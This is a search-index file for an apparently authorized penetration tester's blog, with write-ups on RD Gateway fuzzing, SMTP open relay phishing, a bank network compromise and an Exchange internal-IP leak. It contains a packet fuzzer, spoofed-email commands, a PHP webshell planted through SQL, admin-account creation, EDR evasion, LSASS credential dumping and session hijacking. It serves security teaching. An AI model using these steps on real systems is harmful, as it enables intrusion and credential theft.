{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Cybersecurity Blog Posts by Jamie Warren Philippe Welcome to my collection of cybersecurity write-ups, where I explore real-world vulnerabilities, penetration testing techniques, and security misconfigurations. \ud83d\udccc Featured Posts: Exploiting RD Gateway Vulnerability A deep dive into abusing Remote Desktop Gateway misconfigurations. Exploiting SMTP Open Relays How open SMTP relays can be abused for spam, phishing, and data exfiltration. How to Own a Bank A pentesting story showcasing privilege escalation, lateral movement, and security failures. Microsoft Exchange Client Access Server Information Disclosure Discusses an information disclosure bug in Exchange CAS revealing internal IPs. SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services Explores how SNMP GETBULK can be exploited for large-scale DDoS amplification. Shadow IT \u2013 The Hidden Risk in Organizations How unauthorized IT systems pose security risks and how to mitigate them. \ud83d\udcc2 Additional Resources: source_codes/ - Contains proof-of-concept scripts and attack simulations. \u26a0\ufe0f Disclaimer: These posts are for educational purposes only . The techniques discussed should only be used for legal penetration testing, security research, and ethical hacking. \ud83d\udce2 Feedback & Contributions: Feel free to raise issues, suggest improvements, or share your thoughts in the comments. \ud83d\ude80 Stay secure, stay ethical!","title":"Home"},{"location":"#cybersecurity-blog-posts-by-jamie-warren-philippe","text":"Welcome to my collection of cybersecurity write-ups, where I explore real-world vulnerabilities, penetration testing techniques, and security misconfigurations.","title":"Cybersecurity Blog Posts by Jamie Warren Philippe"},{"location":"#featured-posts","text":"Exploiting RD Gateway Vulnerability A deep dive into abusing Remote Desktop Gateway misconfigurations. Exploiting SMTP Open Relays How open SMTP relays can be abused for spam, phishing, and data exfiltration. How to Own a Bank A pentesting story showcasing privilege escalation, lateral movement, and security failures. Microsoft Exchange Client Access Server Information Disclosure Discusses an information disclosure bug in Exchange CAS revealing internal IPs. SNMP 'GETBULK' Reflection DDoS \u2013 Weaponizing Network Services Explores how SNMP GETBULK can be exploited for large-scale DDoS amplification. Shadow IT \u2013 The Hidden Risk in Organizations How unauthorized IT systems pose security risks and how to mitigate them.","title":"\ud83d\udccc Featured Posts:"},{"location":"#additional-resources","text":"source_codes/ - Contains proof-of-concept scripts and attack simulations.","title":"\ud83d\udcc2 Additional Resources:"},{"location":"#disclaimer","text":"These posts are for educational purposes only . The techniques discussed should only be used for legal penetration testing, security research, and ethical hacking.","title":"\u26a0\ufe0f Disclaimer:"},{"location":"#feedback-contributions","text":"Feel free to raise issues, suggest improvements, or share your thoughts in the comments. \ud83d\ude80 Stay secure, stay ethical!","title":"\ud83d\udce2 Feedback &amp; Contributions:"},{"location":"ExploitingRDGatewayVuln/","text":"\ud83d\ude80 Exploiting RD Gateway Vulnerabilities with Malformed CONNECT_PKT_FRAGMENT Messages Introduction Ah, Microsoft\u2019s Remote Desktop Gateway (RDG)\u2014the thing that lets you securely RDP over HTTPS while simultaneously serving as an all-you-can-exploit buffet for attackers. Today, we're diving into CVE-2020-0609 and CVE-2020-0610 , two little gems that let us cause memory corruption and DoS with malformed packets. Because why not? Here\u2019s what\u2019s on the menu: 1. A breakdown of CONNECT_PKT_FRAGMENT packets. (Like an autopsy, but nerdier.) 2. How a malformed packet ruins RDG\u2019s day. 3. A Python fuzzing script to test for vulnerabilities. Because breaking things is fun. Understanding the CONNECT_PKT_FRAGMENT Structure RD Gateway operates using fragments of connection packets (like your attention span on a Monday morning). A CONNECT_PKT_FRAGMENT usually looks like this: Bytes Meaning \\x03\\x00 TPKT Header (Length Indicator) \\x00\\x13 Total Packet Length (19 bytes) \\x0e\\xd0 Session Length/Fragment Size \\x00\\x00 Flags or Reserved Bytes \\x12\\x34 Transaction ID or Connection Identifier \\x00\\x02 Fragment Count or Connection Status \\x00\\x1f Reserved or Message Type Indicator \\x00\\x00 Padding or Checksum Placeholder A malformed CONNECT_PKT_FRAGMENT can cause RDG to throw a tantrum, crash, and sometimes even give you remote code execution. Not ideal for sysadmins, but a delightful surprise for pentesters. Python Fuzzing Script for RD Gateway Want to stress-test RD Gateway? Here\u2019s a Python script that generates and sends malformed packets because, well, curiosity killed the cat\u2014but satisfaction brought it back. import socket import random import struct import time # Target RD Gateway server details TARGET_HOST = \"target-rd-gateway.com\" # Change this to your target TARGET_PORT = 3391 # Default RDG port # Function to generate malformed CONNECT_PKT_FRAGMENT packets def generate_malformed_packet(): \"\"\" Generates a malformed CONNECT_PKT_FRAGMENT message. Randomizes values to trigger unexpected behavior. \"\"\" packet = b\"\\x03\\x00\" # TPKT Header length = random.randint(10, 40) # Random length to cause buffer overflows packet += struct.pack(\">H\", length) # Incorrect length field # Randomized fragment payload with potentially dangerous values packet += struct.pack(\">H\", random.randint(0x0001, 0xFFFF)) # Random fragment ID packet += struct.pack(\">H\", random.randint(0x0001, 0xFFFF)) # Random size value packet += struct.pack(\">H\", random.randint(0x0000, 0x00FF)) # Reserved bytes packet += struct.pack(\">H\", random.randint(0x0000, 0xFFFF)) # Fake Connection ID packet += struct.pack(\">H\", random.randint(0x0000, 0xFFFF)) # Invalid Fragment Count packet += b\"\\x00\" * (length - len(packet)) # Padding with nulls to match length return packet # Function to send malformed packets def send_malformed_packet(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: try: print(f\"[+] Connecting to {TARGET_HOST}:{TARGET_PORT}...\") sock.connect((TARGET_HOST, TARGET_PORT)) for i in range(10): # Send multiple packets to test behavior payload = generate_malformed_packet() print(f\"[+] Sending malformed packet {i+1}...\") sock.send(payload) try: response = sock.recv(1024) print(f\"[-] Response: {response.hex()}\") except socket.timeout: print(\"[!] No response (possible crash)\") time.sleep(1) # Delay between attempts except Exception as e: print(f\"[!] Error: {e}\") # Run the attack simulation send_malformed_packet() Expected Outcomes If the service crashes \u2192 Congrats, you found a vulnerability! \ud83c\udf89 If you get an error message \u2192 RDG might be patched, or you need to be sneakier. If nothing happens \u2192 Well, that\u2019s anticlimactic. Mitigations & Recommendations Patch RD Gateway (Yes, we know updates are annoying, but so is getting pwned). Enable Network-Level Authentication (NLA) to reduce exposure. Use an IDS/IPS to detect and block malformed RDP packets before they ruin your day. Restrict RD Gateway access \u2014seriously, don\u2019t let the entire internet RDP into your network. Conclusion And there you have it! By sending malformed CONNECT_PKT_FRAGMENT messages , we can make RD Gateway go boom . Use responsibly, disclose responsibly, and maybe buy your blue team a coffee after testing (because you will give them a headache). \ud83d\udd39 Want to explore RCE exploitation? Stay tuned for the next post! \ud83d\ude80 \ud83d\udcac Have questions or feedback? Drop a comment below, or send a strongly worded email to your nearest sysadmin! \ud83d\ude09","title":"Exploiting RD Gateway Vulnerability"},{"location":"ExploitingRDGatewayVuln/#exploiting-rd-gateway-vulnerabilities-with-malformed-connect_pkt_fragment-messages","text":"","title":"\ud83d\ude80 Exploiting RD Gateway Vulnerabilities with Malformed CONNECT_PKT_FRAGMENT Messages"},{"location":"ExploitingRDGatewayVuln/#introduction","text":"Ah, Microsoft\u2019s Remote Desktop Gateway (RDG)\u2014the thing that lets you securely RDP over HTTPS while simultaneously serving as an all-you-can-exploit buffet for attackers. Today, we're diving into CVE-2020-0609 and CVE-2020-0610 , two little gems that let us cause memory corruption and DoS with malformed packets. Because why not? Here\u2019s what\u2019s on the menu: 1. A breakdown of CONNECT_PKT_FRAGMENT packets. (Like an autopsy, but nerdier.) 2. How a malformed packet ruins RDG\u2019s day. 3. A Python fuzzing script to test for vulnerabilities. Because breaking things is fun.","title":"Introduction"},{"location":"ExploitingRDGatewayVuln/#understanding-the-connect_pkt_fragment-structure","text":"RD Gateway operates using fragments of connection packets (like your attention span on a Monday morning). A CONNECT_PKT_FRAGMENT usually looks like this: Bytes Meaning \\x03\\x00 TPKT Header (Length Indicator) \\x00\\x13 Total Packet Length (19 bytes) \\x0e\\xd0 Session Length/Fragment Size \\x00\\x00 Flags or Reserved Bytes \\x12\\x34 Transaction ID or Connection Identifier \\x00\\x02 Fragment Count or Connection Status \\x00\\x1f Reserved or Message Type Indicator \\x00\\x00 Padding or Checksum Placeholder A malformed CONNECT_PKT_FRAGMENT can cause RDG to throw a tantrum, crash, and sometimes even give you remote code execution. Not ideal for sysadmins, but a delightful surprise for pentesters.","title":"Understanding the CONNECT_PKT_FRAGMENT Structure"},{"location":"ExploitingRDGatewayVuln/#python-fuzzing-script-for-rd-gateway","text":"Want to stress-test RD Gateway? Here\u2019s a Python script that generates and sends malformed packets because, well, curiosity killed the cat\u2014but satisfaction brought it back. import socket import random import struct import time # Target RD Gateway server details TARGET_HOST = \"target-rd-gateway.com\" # Change this to your target TARGET_PORT = 3391 # Default RDG port # Function to generate malformed CONNECT_PKT_FRAGMENT packets def generate_malformed_packet(): \"\"\" Generates a malformed CONNECT_PKT_FRAGMENT message. Randomizes values to trigger unexpected behavior. \"\"\" packet = b\"\\x03\\x00\" # TPKT Header length = random.randint(10, 40) # Random length to cause buffer overflows packet += struct.pack(\">H\", length) # Incorrect length field # Randomized fragment payload with potentially dangerous values packet += struct.pack(\">H\", random.randint(0x0001, 0xFFFF)) # Random fragment ID packet += struct.pack(\">H\", random.randint(0x0001, 0xFFFF)) # Random size value packet += struct.pack(\">H\", random.randint(0x0000, 0x00FF)) # Reserved bytes packet += struct.pack(\">H\", random.randint(0x0000, 0xFFFF)) # Fake Connection ID packet += struct.pack(\">H\", random.randint(0x0000, 0xFFFF)) # Invalid Fragment Count packet += b\"\\x00\" * (length - len(packet)) # Padding with nulls to match length return packet # Function to send malformed packets def send_malformed_packet(): with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock: try: print(f\"[+] Connecting to {TARGET_HOST}:{TARGET_PORT}...\") sock.connect((TARGET_HOST, TARGET_PORT)) for i in range(10): # Send multiple packets to test behavior payload = generate_malformed_packet() print(f\"[+] Sending malformed packet {i+1}...\") sock.send(payload) try: response = sock.recv(1024) print(f\"[-] Response: {response.hex()}\") except socket.timeout: print(\"[!] No response (possible crash)\") time.sleep(1) # Delay between attempts except Exception as e: print(f\"[!] Error: {e}\") # Run the attack simulation send_malformed_packet()","title":"Python Fuzzing Script for RD Gateway"},{"location":"ExploitingRDGatewayVuln/#expected-outcomes","text":"If the service crashes \u2192 Congrats, you found a vulnerability! \ud83c\udf89 If you get an error message \u2192 RDG might be patched, or you need to be sneakier. If nothing happens \u2192 Well, that\u2019s anticlimactic.","title":"Expected Outcomes"},{"location":"ExploitingRDGatewayVuln/#mitigations-recommendations","text":"Patch RD Gateway (Yes, we know updates are annoying, but so is getting pwned). Enable Network-Level Authentication (NLA) to reduce exposure. Use an IDS/IPS to detect and block malformed RDP packets before they ruin your day. Restrict RD Gateway access \u2014seriously, don\u2019t let the entire internet RDP into your network.","title":"Mitigations &amp; Recommendations"},{"location":"ExploitingRDGatewayVuln/#conclusion","text":"And there you have it! By sending malformed CONNECT_PKT_FRAGMENT messages , we can make RD Gateway go boom . Use responsibly, disclose responsibly, and maybe buy your blue team a coffee after testing (because you will give them a headache). \ud83d\udd39 Want to explore RCE exploitation? Stay tuned for the next post! \ud83d\ude80 \ud83d\udcac Have questions or feedback? Drop a comment below, or send a strongly worded email to your nearest sysadmin! \ud83d\ude09","title":"Conclusion"},{"location":"Exploiting_SMTP_Open_Relays/","text":"Exploiting SMTP Open Relays \u2013 When Mail Servers Become Attack Vectors Introduction In penetration testing, some of the most overlooked yet dangerous vulnerabilities come from misconfigured mail servers . Specifically, an SMTP open relay allows unauthorized users to send emails as anyone \u2014a perfect recipe for phishing, social engineering, and spoofing attacks. Let\u2019s explore how attackers exploit this misconfiguration and how organizations can defend against it. The Basics of SMTP Open Relays SMTP (Simple Mail Transfer Protocol) is the standard protocol for sending emails. However, a mail server should only relay messages from authorized senders . An open relay is a misconfigured SMTP server that allows anyone to send emails, effectively letting attackers impersonate legitimate users. \ud83d\udd25 Why is this dangerous? \u2705 Email Spoofing: Attackers can send emails that appear to come from trusted sources. \u2705 Bypassing Spam Filters: Since the email originates from a legitimate domain, it may evade security measures. \u2705 Phishing Attacks: Hackers can craft highly convincing fake emails. \u2705 Spreading Malware & Ransomware: Victims may download malicious payloads. Real-World Attack Scenario \ud83d\udc80 Target: A financial institution\u2019s SMTP relay During a penetration test, we discovered that the bank\u2019s SMTP server allowed unauthenticated mail relays. Using this misconfiguration, we: 1\ufe0f\u20e3 Spoofed emails from security@bank.com and sent them to employees. 2\ufe0f\u20e3 Created a phishing campaign that instructed users to reset their VPN credentials. 3\ufe0f\u20e3 Harvested multiple valid credentials , leading to lateral movement within the network. \ud83d\udea8 Impact: This attack could have been used for internal fraud, account takeovers, or ransomware deployment. Exploiting an Open Relay Once an SMTP open relay is found, testing it is straightforward using swaks : swaks --to victim@target.com --from ceo@target.com --server mail.target.com If the email is delivered successfully without authentication , the mail server is an open relay. Another method is using telnet : telnet mail.target.com 25 HELO attacker.com MAIL FROM: ceo@target.com RCPT TO: victim@target.com DATA Subject: Urgent Security Update Please reset your password at http://fake-reset.com . QUIT If the email is relayed successfully, the vulnerability is confirmed. Defending Against SMTP Open Relays \ud83d\udd12 Best Practices: \u2714\ufe0f Restrict Relaying: Ensure that only authenticated users can send emails. \u2714\ufe0f Implement SPF, DKIM, and DMARC: Prevent spoofed emails from passing security checks. \u2714\ufe0f Monitor and Log SMTP Traffic: Look for unusual spikes in outgoing emails. \u2714\ufe0f Test Your Mail Server: Use swaks or smtpdiag to check for unauthorized relays. \u2714\ufe0f Block External SMTP Traffic on Firewalls: Unless necessary, prevent outbound traffic on port 25. Conclusion SMTP open relays are a silent but powerful attack vector that can lead to devastating phishing campaigns, credential theft, and fraud. Regular security audits, proper mail server configuration, and strict email policies can mitigate these risks. \ud83d\ude80 Pentesters: Always test for open relays, as they can provide easy entry points. \ud83d\udd10 Defenders: Secure your mail servers before an attacker finds them first. \ud83d\udcac Have you ever encountered an SMTP open relay in the wild? Share your experiences below!","title":"Exploiting SMTP Open Relays"},{"location":"Exploiting_SMTP_Open_Relays/#exploiting-smtp-open-relays-when-mail-servers-become-attack-vectors","text":"","title":"Exploiting SMTP Open Relays \u2013 When Mail Servers Become Attack Vectors"},{"location":"Exploiting_SMTP_Open_Relays/#introduction","text":"In penetration testing, some of the most overlooked yet dangerous vulnerabilities come from misconfigured mail servers . Specifically, an SMTP open relay allows unauthorized users to send emails as anyone \u2014a perfect recipe for phishing, social engineering, and spoofing attacks. Let\u2019s explore how attackers exploit this misconfiguration and how organizations can defend against it.","title":"Introduction"},{"location":"Exploiting_SMTP_Open_Relays/#the-basics-of-smtp-open-relays","text":"SMTP (Simple Mail Transfer Protocol) is the standard protocol for sending emails. However, a mail server should only relay messages from authorized senders . An open relay is a misconfigured SMTP server that allows anyone to send emails, effectively letting attackers impersonate legitimate users.","title":"The Basics of SMTP Open Relays"},{"location":"Exploiting_SMTP_Open_Relays/#why-is-this-dangerous","text":"\u2705 Email Spoofing: Attackers can send emails that appear to come from trusted sources. \u2705 Bypassing Spam Filters: Since the email originates from a legitimate domain, it may evade security measures. \u2705 Phishing Attacks: Hackers can craft highly convincing fake emails. \u2705 Spreading Malware & Ransomware: Victims may download malicious payloads.","title":"\ud83d\udd25 Why is this dangerous?"},{"location":"Exploiting_SMTP_Open_Relays/#real-world-attack-scenario","text":"\ud83d\udc80 Target: A financial institution\u2019s SMTP relay During a penetration test, we discovered that the bank\u2019s SMTP server allowed unauthenticated mail relays. Using this misconfiguration, we: 1\ufe0f\u20e3 Spoofed emails from security@bank.com and sent them to employees. 2\ufe0f\u20e3 Created a phishing campaign that instructed users to reset their VPN credentials. 3\ufe0f\u20e3 Harvested multiple valid credentials , leading to lateral movement within the network. \ud83d\udea8 Impact: This attack could have been used for internal fraud, account takeovers, or ransomware deployment.","title":"Real-World Attack Scenario"},{"location":"Exploiting_SMTP_Open_Relays/#exploiting-an-open-relay","text":"Once an SMTP open relay is found, testing it is straightforward using swaks : swaks --to victim@target.com --from ceo@target.com --server mail.target.com If the email is delivered successfully without authentication , the mail server is an open relay. Another method is using telnet : telnet mail.target.com 25 HELO attacker.com MAIL FROM: ceo@target.com RCPT TO: victim@target.com DATA Subject: Urgent Security Update Please reset your password at http://fake-reset.com . QUIT If the email is relayed successfully, the vulnerability is confirmed.","title":"Exploiting an Open Relay"},{"location":"Exploiting_SMTP_Open_Relays/#defending-against-smtp-open-relays","text":"\ud83d\udd12 Best Practices: \u2714\ufe0f Restrict Relaying: Ensure that only authenticated users can send emails. \u2714\ufe0f Implement SPF, DKIM, and DMARC: Prevent spoofed emails from passing security checks. \u2714\ufe0f Monitor and Log SMTP Traffic: Look for unusual spikes in outgoing emails. \u2714\ufe0f Test Your Mail Server: Use swaks or smtpdiag to check for unauthorized relays. \u2714\ufe0f Block External SMTP Traffic on Firewalls: Unless necessary, prevent outbound traffic on port 25.","title":"Defending Against SMTP Open Relays"},{"location":"Exploiting_SMTP_Open_Relays/#conclusion","text":"SMTP open relays are a silent but powerful attack vector that can lead to devastating phishing campaigns, credential theft, and fraud. Regular security audits, proper mail server configuration, and strict email policies can mitigate these risks. \ud83d\ude80 Pentesters: Always test for open relays, as they can provide easy entry points. \ud83d\udd10 Defenders: Secure your mail servers before an attacker finds them first. \ud83d\udcac Have you ever encountered an SMTP open relay in the wild? Share your experiences below!","title":"Conclusion"},{"location":"How_to_Own_a_Bank/","text":"From Directory Listing to Owning a Bank: A Wild Ride with phpMyAdmin, XAMPP, and a PAM that Didn't Give a Damn The Setup: \"Oops, We Left Everything Open\" So there I was, minding my own business (aka breaking into a bank\u2019s network for totally legal reasons), when I stumbled upon a webserver running XAMPP on a fully patched Windows Server. At first, I thought, \"Okay, maybe they actually know what they're doing.\" Then, I ran dirb and found directory listing enabled. Rookie mistake #1. Step 1: The Accidental Gift \u2013 Directory Listing It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran: dirb http://targetbank.com/ Boom. A treasure trove of exposed files, including a /phpmyadmin/ folder. Classic. and I was in. Rookie mistake #2. Step 2: Oh Look, PhpMyAdmin \u2013 Let\u2019s Try Defaults and give them a supprise! I took a gamble and tried the usual default credentials: Username: root Password: (blank) Guess what? It worked. Because, of course, it did. With full control over the database, I simply used SELECT INTO OUTFILE to write a PHP web shell directly into htdocs . SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'; Boom. Webshell live at http://bankserver/shell.php . Step 3: Making Myself at Home (Persistence 101) Checking the privileges, I realized XAMPP was running under NT AUTHORITY\\SYSTEM. Oh, this was going to be fun. Rookie mistake #3. And also, I wasn\u2019t about to leave this beautiful new playground unprotected. So, using my webshell, I ran: curl \"http://targetbank.com/shell.php?cmd=net user pentester mysecurepassword /add\" curl \"http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add\" BOOOOM!!! Hello, new local admin user. Step 4: Fighting Cylance EDR (and Winning) This is where things got even funnier. Every time I tried to run Mimikatz , Cylance EDR slapped me like an overprotective parent. So I tried stopping the service: sc stop Cylance Cylance: \"LOL, you thought.\" The service was marked non-stoppable. But guess what? I could still change the startup type : sc config Cylance start= demand Now, I just needed to reboot the server. I used the good old \"extended ping\" trick to monitor when it was back: ping -t bankserver As soon as it came online, I refreshed my webshell. This time, Mimikatz worked like a charm. With Mimikatz, I dumped the LSASS, downloaded it for offline paswword cracking, mimikatz# sekurlsa::minidump lsass.dmp Step 5: RDP and Session Hijacking Since this part now fell under the the greybox part of the assessment, I politely (read: strategically) asked them to allow my RDP traffic through the firewall. Once I was in, I used the persistent account I had created earlier: rdesktop -u pentester -p mysecurepassword targetbank.com Once in, I used PsExec to elevate myself to SYSTEM: PsExec.exe -s -i cmd.exe And ran: query session Guess what? Administrator left their session inactive but open. Rookie mistake #4. I could not let it like this without Hijacking it. tscon 2 /dest:console And boom\u2014Administrator session hijacked. But then\u2026 poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump. So, I cracked the dump offline: mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit or using Linux: pypykatz lsa minidump lsass.dmp And got creds for BankAdmin1, a local admin account used on multiple critical servers.(because why follow best practices, right?) Step 6: The Domain Controller & The CyberArk \"PAM\" Disaster While moving laterally, I hit the Domain Controller. This is where things took an unexpected turn. I also found a network-mounted drive on the initial compromised machine containing a plaintext file with a URL to their PAM (CyberArk). \ud83e\udd26 So, being the responsible hacker I am, I: - Used the credentials obtained from LSASS dump cracking. - Logged into the Domain Controller. - Created a domain admin account. - Added special permissions to that account to be able to use the PAM. Then I logged into CyberArk with my shiny new domain admin account, and... oh boy. It gave me access to the core banking system. Because why have proper access controls when you can just let your pentester waltz right in? Insert evil laughter here. The Aftermath At this point, I basically had the keys to the kingdom. This entire chain of failures was due to a mix of: 1. Directory listing enabled 2. phpMyAdmin with default creds 3. XAMPP running as SYSTEM 4. EDR that I could disable with a simple restart 5. A bank that stored their own security tool URLs in a plaintext file 6. Domain-wide local admin credentials If this wasn\u2019t a real pentest, it would have made a fantastic heist movie. Moral of the Story: Secure your systems, disable default credentials, and please don\u2019t leave your privileged accounts lying around. Otherwise, you\u2019ll end up reading about your security failures in a blog post like this. \ud83d\ude0f","title":"How to Own a Bank"},{"location":"How_to_Own_a_Bank/#from-directory-listing-to-owning-a-bank-a-wild-ride-with-phpmyadmin-xampp-and-a-pam-that-didnt-give-a-damn","text":"","title":"From Directory Listing to Owning a Bank: A Wild Ride with phpMyAdmin, XAMPP, and a PAM that Didn't Give a Damn"},{"location":"How_to_Own_a_Bank/#the-setup-oops-we-left-everything-open","text":"So there I was, minding my own business (aka breaking into a bank\u2019s network for totally legal reasons), when I stumbled upon a webserver running XAMPP on a fully patched Windows Server. At first, I thought, \"Okay, maybe they actually know what they're doing.\" Then, I ran dirb and found directory listing enabled. Rookie mistake #1.","title":"The Setup: \"Oops, We Left Everything Open\""},{"location":"How_to_Own_a_Bank/#step-1-the-accidental-gift-directory-listing","text":"It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran: dirb http://targetbank.com/ Boom. A treasure trove of exposed files, including a /phpmyadmin/ folder. Classic. and I was in. Rookie mistake #2.","title":"Step 1: The Accidental Gift \u2013 Directory Listing"},{"location":"How_to_Own_a_Bank/#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise","text":"I took a gamble and tried the usual default credentials: Username: root Password: (blank) Guess what? It worked. Because, of course, it did. With full control over the database, I simply used SELECT INTO OUTFILE to write a PHP web shell directly into htdocs . SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'; Boom. Webshell live at http://bankserver/shell.php .","title":"Step 2: Oh Look, PhpMyAdmin \u2013 Let\u2019s Try Defaults and give them a supprise!"},{"location":"How_to_Own_a_Bank/#step-3-making-myself-at-home-persistence-101","text":"Checking the privileges, I realized XAMPP was running under NT AUTHORITY\\SYSTEM. Oh, this was going to be fun. Rookie mistake #3. And also, I wasn\u2019t about to leave this beautiful new playground unprotected. So, using my webshell, I ran: curl \"http://targetbank.com/shell.php?cmd=net user pentester mysecurepassword /add\" curl \"http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add\" BOOOOM!!! Hello, new local admin user.","title":"Step 3: Making Myself at Home (Persistence 101)"},{"location":"How_to_Own_a_Bank/#step-4-fighting-cylance-edr-and-winning","text":"This is where things got even funnier. Every time I tried to run Mimikatz , Cylance EDR slapped me like an overprotective parent. So I tried stopping the service: sc stop Cylance Cylance: \"LOL, you thought.\" The service was marked non-stoppable. But guess what? I could still change the startup type : sc config Cylance start= demand Now, I just needed to reboot the server. I used the good old \"extended ping\" trick to monitor when it was back: ping -t bankserver As soon as it came online, I refreshed my webshell. This time, Mimikatz worked like a charm. With Mimikatz, I dumped the LSASS, downloaded it for offline paswword cracking, mimikatz# sekurlsa::minidump lsass.dmp","title":"Step 4: Fighting Cylance EDR (and Winning)"},{"location":"How_to_Own_a_Bank/#step-5-rdp-and-session-hijacking","text":"Since this part now fell under the the greybox part of the assessment, I politely (read: strategically) asked them to allow my RDP traffic through the firewall. Once I was in, I used the persistent account I had created earlier: rdesktop -u pentester -p mysecurepassword targetbank.com Once in, I used PsExec to elevate myself to SYSTEM: PsExec.exe -s -i cmd.exe And ran: query session Guess what? Administrator left their session inactive but open. Rookie mistake #4. I could not let it like this without Hijacking it. tscon 2 /dest:console And boom\u2014Administrator session hijacked. But then\u2026 poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump. So, I cracked the dump offline: mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit or using Linux: pypykatz lsa minidump lsass.dmp And got creds for BankAdmin1, a local admin account used on multiple critical servers.(because why follow best practices, right?)","title":"Step 5: RDP and Session Hijacking"},{"location":"How_to_Own_a_Bank/#step-6-the-domain-controller-the-cyberark-pam-disaster","text":"While moving laterally, I hit the Domain Controller. This is where things took an unexpected turn. I also found a network-mounted drive on the initial compromised machine containing a plaintext file with a URL to their PAM (CyberArk). \ud83e\udd26 So, being the responsible hacker I am, I: - Used the credentials obtained from LSASS dump cracking. - Logged into the Domain Controller. - Created a domain admin account. - Added special permissions to that account to be able to use the PAM. Then I logged into CyberArk with my shiny new domain admin account, and... oh boy. It gave me access to the core banking system. Because why have proper access controls when you can just let your pentester waltz right in? Insert evil laughter here.","title":"Step 6: The Domain Controller &amp; The CyberArk \"PAM\" Disaster"},{"location":"How_to_Own_a_Bank/#the-aftermath","text":"At this point, I basically had the keys to the kingdom. This entire chain of failures was due to a mix of: 1. Directory listing enabled 2. phpMyAdmin with default creds 3. XAMPP running as SYSTEM 4. EDR that I could disable with a simple restart 5. A bank that stored their own security tool URLs in a plaintext file 6. Domain-wide local admin credentials If this wasn\u2019t a real pentest, it would have made a fantastic heist movie.","title":"The Aftermath"},{"location":"How_to_Own_a_Bank/#moral-of-the-story","text":"Secure your systems, disable default credentials, and please don\u2019t leave your privileged accounts lying around. Otherwise, you\u2019ll end up reading about your security failures in a blog post like this. \ud83d\ude0f","title":"Moral of the Story:"},{"location":"MsExchangeInfoDisclosure/","text":"title: \"Microsoft Exchange Client Access Server Information Disclosure: The \"Oops, Here\u2019s My Internal IP\" Bug\" author: \"Jamie Warren Philippe\" date: \"2025-02-13\" categories: [Cybersecurity, Disclosure, Exploits, Microsoft] tags: [Microsoft, Exchange, Information Attack, Disclosure, Exploitation] Microsoft Exchange Client Access Server Information Disclosure: The \"Oops, Here\u2019s My Internal IP\" Bug The Scene: An External Pentest Gone Too Well Ah, Microsoft Exchange\u2014the gift that keeps on giving. During an external penetration test, I stumbled upon an information disclosure bug that made recon a breeze. Instead of sweating over OSINT and pivoting through obscure DNS leaks, the Exchange Client Access Server (CAS) decided to just hand me its internal IP like a confused mall security guard giving out the WiFi password. The Setup: IIS 10.0, HTTP/1.0, and a Misconfigured Host Header The server was running IIS 10.0 , and I found that if you send a good ol\u2019 HTTP/1.0 request while supplying an empty Host header , the response would include some juicy internal information\u2014specifically, the private IP address of the server, neatly tucked away in the WWW-Authenticate realm header . The \"Elite\" Exploit (a.k.a. Running Curl) This is one of those exploits where you don\u2019t need a fancy zero-day or an obscure Python script. Nope, just some good old curl : curl -X GET http://target.com/owa/ -H \"Host:\" --http1.0 -i Expected Response: HTTP/1.1 401 Unauthorized WWW-Authenticate: Negotiate WWW-Authenticate: NTLM realm=\"192.168.1.50\" Oh no, Exchange! You weren\u2019t supposed to tell me that! Why This Works: Exchange + IIS Being \"Helpful\" By default, Exchange CAS servers running on IIS 10.0 love to respond to authentication requests in a way that includes the internal realm. Normally, this isn\u2019t an issue\u2014unless, of course, someone forgot to properly configure the headers and now every unauthenticated request leaks the internal network structure . And let\u2019s be honest: most admins are too busy fighting Outlook issues to bother with security headers. The \"Why Should You Care?\" Section What can an attacker do with an internal IP? Well, for starters: - Refine attack paths: Knowing the internal structure makes pivoting much easier. - Bypass some poorly configured security policies: If there's a split-tunnel VPN or weak firewall rules, this can be gold. - Social engineering fuel: \"Oh hey, IT helpdesk? Yeah, I\u2019m calling from 192.168.1.50, we got a problem...\" NGL, I lacked some inspiration on that one How to Fix This (If You\u2019re an Admin and Now Panicking) Luckily, this one\u2019s an easy fix (assuming you don\u2019t ignore it like that pile of pending updates on your test server): Disable NTLM authentication over HTTP (force it over HTTPS) Set up proper response headers to avoid leaking internal details Use a reverse proxy or WAF to filter and block HTTP/1.0 requests Audit Exchange CAS configurations (because this probably isn\u2019t the only issue) Final Thoughts It\u2019s 2025, and Microsoft Exchange is still finding new ways to embarrass itself. But hey, if you\u2019re a pentester, it\u2019s free recon with minimal effort\u2014so thanks, Exchange, for making external engagements just a little bit easier. \ud83c\udf89 Next Up: \"From Directory Listing to Webshell to Domain Admin\u2014Because Why Make It Hard?\"","title":"Ms Exchange Info Disclosure"},{"location":"MsExchangeInfoDisclosure/#microsoft-exchange-client-access-server-information-disclosure-the-oops-heres-my-internal-ip-bug","text":"","title":"Microsoft Exchange Client Access Server Information Disclosure: The \"Oops, Here\u2019s My Internal IP\" Bug"},{"location":"MsExchangeInfoDisclosure/#the-scene-an-external-pentest-gone-too-well","text":"Ah, Microsoft Exchange\u2014the gift that keeps on giving. During an external penetration test, I stumbled upon an information disclosure bug that made recon a breeze. Instead of sweating over OSINT and pivoting through obscure DNS leaks, the Exchange Client Access Server (CAS) decided to just hand me its internal IP like a confused mall security guard giving out the WiFi password.","title":"The Scene: An External Pentest Gone Too Well"},{"location":"MsExchangeInfoDisclosure/#the-setup-iis-100-http10-and-a-misconfigured-host-header","text":"The server was running IIS 10.0 , and I found that if you send a good ol\u2019 HTTP/1.0 request while supplying an empty Host header , the 